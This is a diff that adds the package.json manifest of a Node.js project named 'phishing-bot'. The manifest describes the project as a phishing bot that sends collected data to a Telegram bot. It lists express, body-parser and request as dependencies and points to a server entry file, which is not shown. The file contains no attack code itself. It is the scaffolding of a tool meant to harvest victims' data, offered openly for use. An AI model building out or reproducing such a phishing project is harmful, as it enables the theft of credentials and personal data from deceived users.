@@ -1,0 +1,14 @@
+{
+  "name": "phishing-bot",
+  "version": "1.0.0",
+  "description": "A phishing bot that sends data to a Telegram bot",
+  "main": "functions/app.js",
+  "scripts": {
+    "start": "node functions/app.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "body-parser": "^1.19.0",
+    "request": "^2.88.2"
+  }
+}
